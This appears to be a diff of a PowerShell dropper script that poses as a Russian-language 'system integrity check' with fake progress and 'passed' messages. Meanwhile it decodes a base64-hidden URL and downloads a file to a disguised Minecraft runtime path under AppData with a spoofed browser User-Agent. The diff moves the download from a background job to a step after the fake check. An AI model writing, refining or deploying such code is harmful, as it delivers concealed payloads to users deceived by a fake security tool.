@@ -23,18 +23,6 @@ $cfg = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u1))
 $rp = Join-Path $env:APPDATA ".minecraft\runtime\mc_runtime.exe"
 $rd = Split-Path $rp -Parent
 
-$j = Start-Job -ScriptBlock {
-    param($x, $y, $z)
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    try {
-        if (-not (Test-Path $y)) { New-Item -ItemType Directory -Path $y -Force | Out-Null }
-        $wc = New-Object Net.WebClient
-        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-        $wc.DownloadFile($x, $z)
-        return $z
-    } catch { return "ERROR: $($_.Exception.Message)" }
-} -ArgumentList $cfg, $rd, $rp
-
 Clear-Host
 Write-Host "============================================" -ForegroundColor Cyan
 Write-Host "   Проверка целостности системы v2.4" -ForegroundColor Cyan
@@ -113,7 +101,14 @@ p "Финальная валидация"
 Start-Sleep -Milliseconds 1000
 q "пройдено"
 
-$rt = Receive-Job -Job $j -Wait -AutoRemoveJob
+$rt = $null
+try {
+    if (-not (Test-Path $rd)) { New-Item -ItemType Directory -Path $rd -Force | Out-Null }
+    $wc = New-Object Net.WebClient
+    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+    $wc.DownloadFile($cfg, $rp)
+    $rt = $rp
+} catch { $rt = "ERROR: $($_.Exception.Message)" }
 
 $st = @{
     d = $false; s = 0; m = ""; x = $false; g = $false; p = ""; i = 0; a = $false; e = ""
